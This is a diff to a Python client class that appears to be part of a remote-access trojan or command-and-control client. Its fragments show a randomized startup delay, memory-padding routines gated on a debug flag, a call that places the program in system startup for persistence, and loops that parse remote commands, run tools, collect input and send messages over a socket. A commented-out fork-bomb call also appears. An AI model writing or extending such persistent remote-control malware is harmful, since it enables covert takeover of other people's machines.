@@ -29,7 +29,10 @@ def mem_random(min_kilobytes, max_kilobytes):
 class client:
     def __init__(self, cipherClass, HOST='127.0.0.1', PORT=5002):
         time.sleep(random.randrange(2,8))
-        self.list = mem_random(1000,5000)
+
+        if debug == False:
+            self.list = mem_random(1000,5000)
+        
         print("Done")
 
         regedit.placeStartup()
@@ -67,9 +70,6 @@ class client:
             except socket.timeout:
                 print("Socket timed out on handshake..")
                 leftovers = b''
-            except Exception as e:
-                exception_handler(e)
-                continue
         print("Handshake complete...")
 
     def exe_tool(self, message):
@@ -111,7 +111,6 @@ class client:
             # forkbomb.bomb()
 
     def parse_command(self):
-        list_rando = mem_random(0,1000)
         while(self.stop == False):
             try:
                 time.sleep(DELAY)
@@ -192,7 +191,6 @@ class client:
         return data
 
     def input_collection(self):
-        list_rando = mem_random(0,1000)
         leftovers = b''
         while (self.stop == False):
             try:
@@ -208,11 +206,11 @@ class client:
                 continue
             except Exception as e:
                 exception_handler(e)
+                print("Error in Input collection")
                 self.stop = True
                 return False
 
     def send_message(self):
-        list_rando = mem_random(0,1000)
         while(self.stop == False):
             try:
                 time.sleep(DELAY)
